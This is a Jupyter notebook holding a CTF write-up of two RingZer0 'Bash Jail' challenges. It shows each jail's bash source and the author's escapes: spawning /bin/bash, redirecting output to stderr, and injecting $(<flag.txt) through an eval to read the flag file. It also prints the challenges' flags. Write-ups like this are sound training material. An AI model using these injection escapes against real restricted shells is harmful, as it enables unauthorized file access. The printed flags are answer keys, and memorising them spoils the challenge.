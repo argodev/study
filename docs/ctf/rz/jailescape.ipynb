{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Jail Escaping"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Bash Jail 1\n",
    "\n",
    "First of this type of challenge. SSH into a machine with given credentials, and you are entered into a limited shell. In this case, you are provided a basic example of what is going on, so you have some idea of how to get out. You see something like the following:\n",
    "\n",
    "```bash\n",
    "RingZer0 Team Online CTF\n",
    "\n",
    "BASH Jail Level 1:\n",
    "Current user is uid=1000(level1) gid=1000(level1) groups=1000(level1)\n",
    "\n",
    "Flag is located at /home/level1/flag.txt\n",
    "\n",
    "Challenge bash code:\n",
    "-----------------------------\n",
    "\n",
    "while :\n",
    "do\n",
    "        echo \"Your input:\"\n",
    "        read input\n",
    "        output=`$input`\n",
    "done \n",
    "\n",
    "-----------------------------\n",
    "Your input:\n",
    "```\n",
    "\n",
    "There are better ways to solve this, but all I did was the following:\n",
    "\n",
    "```bash\n",
    "// provide /bin/bash as my \"input\" :)\n",
    "/bin/bash\n",
    "bash: FLAG-U96l4k6m72a051GgE5EN0rA85499172K: command not found\n",
    "level1@lxc17-bash-jail:~$ \n",
    "```\n",
    "\n",
    "And you have the flag which you can then submit and collect your points.\n",
    "\n",
    "\n",
    "```{note}\n",
    "I knew I was missing something here, so I read a writeup or two after I submitted mine. The key was the supression of stdout. One example I saw had you simply submitting `bash`, and then using `ls 1>&2` followed by `cat flag.txt 1>&2` to get the goods. This was the \"niceness\" that I was hoping for."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "---\n",
    "\n",
    "## Bash Jail 2\n",
    "\n",
    "This one was a little harder, but not too bad. This is what the \"jail\" looked like:\n",
    "\n",
    "```bash\n",
    "function check_space {\n",
    "    if [[ $1 == *[bdks';''&'' ']* ]]\n",
    "    then \n",
    "            return 0\n",
    "    fi\n",
    "\n",
    "    return 1\n",
    "}\n",
    "\n",
    "while :\n",
    "do\n",
    "    echo \"Your input:\"\n",
    "    read input\n",
    "    if check_space \"$input\" \n",
    "    then\n",
    "            echo -e '\\033[0;31mRestricted characters has been used\\033[0m'\n",
    "    else\n",
    "            output=\"echo Your command is: $input\"\n",
    "            eval $output\n",
    "    fi\n",
    "done \n",
    "```\n",
    "\n",
    "I did some testing/experimentation, and finally settled on the following input:\n",
    "\n",
    "```bash\n",
    "$(<flag.txt)\n",
    "Your command is: FLAG-a78i8TFD60z3825292rJ9JK12gIyVI5P\n",
    "```\n",
    "\n",
    "Which seems both simple and elegant at the same time. With this, you can submit the flag and claim your points.\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.6 ('venv': venv)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.10.6"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "8fcf66f6e59375db85f6baa3058ecc2896497378edf6406cdc8f5354216bb4af"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
